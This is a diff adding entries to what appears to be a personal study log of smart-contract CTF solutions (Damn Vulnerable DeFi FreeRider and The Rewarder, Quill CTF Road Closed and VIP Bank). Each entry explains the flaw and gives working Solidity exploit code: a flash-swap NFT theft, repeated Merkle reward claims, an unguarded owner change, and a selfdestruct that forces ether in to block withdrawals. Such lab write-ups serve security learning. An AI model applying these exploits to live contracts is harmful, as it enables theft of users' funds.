@@ -571,4 +571,242 @@ contract MyImplementation is ClimberVault{
 }
 ```
 
+### 2024.09.06
+
+- Damn Vulnerable DeFi: FreeRider
+
+#### FreeRider
+
+Issue:
+
+There are 2 main issues:
+1. fee check is inside _buyOne with msg.value
+   ```solidity
+       if (msg.value < priceToPay) {
+            revert InsufficientPayment();
+        }
+   ```
+2. seller payment sending to new owner
+   ```solidity
+       _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+    
+       // pay seller using cached token
+       payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+   ```
+
+Solve:
+```solidity
+contract FreeRiderExploit{
+    WETH weth;
+    DamnValuableToken token;
+    IUniswapV2Factory uniswapV2Factory;
+    IUniswapV2Router02 uniswapV2Router;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    FreeRiderRecoveryManager recoveryManager;
+    address player;
+
+    uint256 constant NFT_PRICE = 15 ether;
+
+    constructor(
+        WETH _weth,
+        DamnValuableToken _token,
+        IUniswapV2Factory _uniswapV2Factory,
+        IUniswapV2Router02 _uniswapV2Router,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        FreeRiderRecoveryManager _recoveryManager
+    ){
+        weth = _weth;
+        token = _token;
+        uniswapV2Factory = _uniswapV2Factory;
+        uniswapV2Router = _uniswapV2Router;
+        uniswapPair = _uniswapPair;
+        marketplace = _marketplace;
+        nft = _nft;
+        recoveryManager = _recoveryManager;
+        player = msg.sender;
+    }
+
+    function exploit() public{
+        uniswapPair.swap(NFT_PRICE, 0, address(this), "123");
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public{
+        
+        weth.withdraw(NFT_PRICE);
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        marketplace.buyMany{value: NFT_PRICE}(tokenIds);
+
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
+        }
+
+        console.log("*** balance: ", address(this).balance);
+
+        uint256 repay = NFT_PRICE * 1004 / 1000;
+        weth.deposit{value: repay}();
+        weth.transfer(address(uniswapPair), repay);
+
+    }
+    
+    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+```
+
+### 2024.09.07
+
+- Damn Vulnerable DeFi: The Rewarder
+
+#### The Rewarder
+
+Issue:
+
+I think the biggest issue is that the claimed mark only updated while the last claim, which allows duplicate claim:
+```solidity
+            // for the last claim
+            if (i == inputClaims.length - 1) {
+                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            }
+```
+
+Solve:
+
+```solidity
+    function test_theRewarder() public checkSolvedByPlayer {
+        console.log("****", player);
+        uint256 playerDVT = 11524763827831882;
+        uint256 playerWETH = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        IERC20[] memory inputTokens = new IERC20[](2);
+        inputTokens[0] = IERC20(address(dvt));
+        inputTokens[1] = IERC20(address(weth));
+
+        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
+        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
+
+        console.log(expectedDVTLeft, expectedWETHLeft);
+
+        uint256 dvtTxCount = expectedDVTLeft/playerDVT;
+        uint256 wethTxCount = expectedWETHLeft/playerWETH;
+        uint256 txTotal = dvtTxCount + wethTxCount;
+
+        Claim[] memory inputClaims = new Claim[](txTotal);
+
+
+        for(uint i = 0; i < dvtTxCount; i++){
+            inputClaims[i] = Claim({
+                batchNumber: 0, 
+                amount: playerDVT,
+                tokenIndex: 0, // dvt
+                proof: merkle.getProof(dvtLeaves, 188) 
+            });
+        }
+
+        for(uint i = dvtTxCount; i < txTotal; i++){
+            inputClaims[i] = Claim({
+                batchNumber: 0, 
+                amount: playerWETH,
+                tokenIndex: 1, // weth
+                proof: merkle.getProof(wethLeaves, 188) 
+            });
+        }
+
+        distributor.claimRewards(
+            inputClaims, 
+            inputTokens
+        );
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
+```
+
+### 2024.09.09
+
+- Quill CTF: Road Closed
+- Quill CTF: VIP Bank
+
+#### Road Closed
+There is no access control with `addToWhitelist`, so we can call `addToWhitelist` -> `changeOwner` -> `pwn` with a EOA? However, this quiz might want to check the code size while the constructor phase is 0.
+
+
+#### VIP Bank
+The goal is to block the withdraw, which we can take advantage from the `selfdestruct`:
+```solidity
+require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
+        require(balances[msg.sender] >= _amount, "Not enough ether");
+```
+
+#### Solve:
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import {Test, console} from "forge-std/Test.sol";
+import {RoadClosed} from "../src/road-block.sol";
+import {VIP_Bank} from "../src/VIPBank.sol";
+
+contract CounterTest is Test {
+    RoadClosed public roadClosed;
+    VIP_Bank public vipBank;
+
+
+    function setUp() public {
+        roadClosed = new RoadClosed();
+        vipBank = new VIP_Bank();
+    }
+
+    function test_solve_road() public {
+        RoadClosedExploit rce = new RoadClosedExploit(roadClosed);
+        assert(roadClosed.isHacked());
+    }
+
+    function test_solve_vip() public {
+        vipBank.addVIP(address(this));
+        vipBank.deposit{value: 0.05 ether}();
+
+        VIPBankExploit ve = new VIPBankExploit{value: 0.01 ether}(address(vipBank));
+
+        vm.expectRevert();
+        vipBank.withdraw(0.01 ether);
+    }
+
+}
+
+contract RoadClosedExploit{
+    constructor( RoadClosed rc) {
+        rc.addToWhitelist(address(this));
+        rc.changeOwner(address(this));
+        rc.pwn(address(this));
+    }
+}
+
+contract VIPBankExploit{
+    constructor(address bank) payable{
+        selfdestruct(payable(bank));
+    }
+}
+```
+
 <!-- Content_END -->
